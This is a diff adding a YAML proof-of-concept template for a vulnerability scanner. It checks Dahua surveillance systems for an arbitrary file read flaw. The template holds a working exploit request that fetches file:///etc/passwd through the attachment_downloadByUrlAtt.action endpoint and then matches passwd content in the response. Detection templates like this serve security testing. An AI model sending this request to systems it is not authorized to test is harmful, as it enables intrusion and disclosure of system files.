@@ -1,0 +1,17 @@
+id: poc-yaml-dahua-jiankong-arbitrary-file-read
+info:
+  name: Dahua监控任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Dahua
+  osprey-id: vb_2019_0028
+requests:
+- method: GET
+  path: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+  headers: {}
+  expression: 'contains(body, "root:") && !contains(body, "<") && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
